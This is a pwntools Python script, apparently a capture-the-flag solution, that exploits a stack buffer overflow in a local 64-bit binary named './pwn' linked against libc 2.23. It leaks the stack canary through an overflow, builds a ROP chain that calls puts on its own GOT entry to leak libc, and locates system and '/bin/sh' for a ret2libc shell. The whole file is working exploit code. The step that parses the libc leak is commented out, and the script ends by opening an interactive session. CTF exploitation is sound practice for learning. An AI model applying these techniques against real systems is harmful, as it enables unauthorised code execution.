#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux')
e = context.binary = ELF("./pwn")
libc = ELF("./libc-2.23.so")
rop = ROP(e)


puts_plt = e.plt.puts
puts_got = e.got.puts

p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"  
+"\nbreak *0x400aa1"
+"\nbreak *0x400cce"
+"\nbreak *0x400dde"
+"\nc"
)
p.recvuntil(">>")
p.sendline(b"1")
p.recvuntil(">>")
padding = b"0"*0xa8
padding+=b"0"
p.send(padding)

# -----------------------------------------------------------------------------

p.recvuntil(">>")
p.sendline(b"2")
#p.recvuntil(b"[*]PLEASE TREAT HIM WELL.....\n-------------------------\n[*]PLEASE TREAT HIM WELL.....\n-------------------------\n")
p.recvuntil(b"-------------------------").replace(b"-------------------------",b"")
p.recvuntil(b"0"*0xa9)
canaryLeak = p.recv(7)
canary = u64(b"\x00" + canaryLeak)

# #--------------------------------
p.recvuntil(">>")
p.sendline(b"3")
p.recvuntil(">>")
# -----------------------------------------------------------------------------

pop_rdi = rop.find_gadget(["pop rdi"])[0]
binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols.system

p.recvuntil(">>")
p.sendline(b"1")
p.recvuntil(">>")

payload = flat([
    b"0"*0xa8,
    p64(canary),
    b"\x90"*0x8,
    p64(pop_rdi),
    p64(puts_got),
    p64(puts_plt),
    p64(0x400a96)
])

p.send(payload)

# p.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\x0a")

# putsLeak = p.recvline().replace(b"\x0a", b"")

# putsLibc = u64(putsLeak + b"\x00"*(8-len(putsLeak)))

# print(putsLibc)

p.interactive()
